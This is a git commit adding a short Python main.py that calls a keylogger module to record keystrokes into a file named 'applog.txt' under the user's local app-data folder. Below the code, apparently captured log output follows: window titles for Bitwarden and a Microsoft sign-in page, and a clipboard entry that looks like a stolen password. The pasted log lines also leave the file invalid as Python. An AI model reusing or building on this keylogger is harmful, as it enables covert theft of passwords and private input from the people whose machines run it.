a435f1a40c358f131ca240bd509314439c50fd1a
samir807 <58141175+samir807@users.noreply.github.com>
2020-08-04 16:30:49 +0300

    Create main.py

---
+++ main.py
@@ -0,0 +1,12 @@
+import os
+from modules import keylogger
+
+log_dir = os.environ['localappdata']
+log_name = 'applog.txt'
+
+keylogger.get_keystrokes(log_dir, log_name)
+
+b'Bitwarden'
+b'Sign in to your Microsoft account - Firefox Developer Edition (Private Browsing)'
+<Ctrl>
+[CLIPBOARD] p1zz4
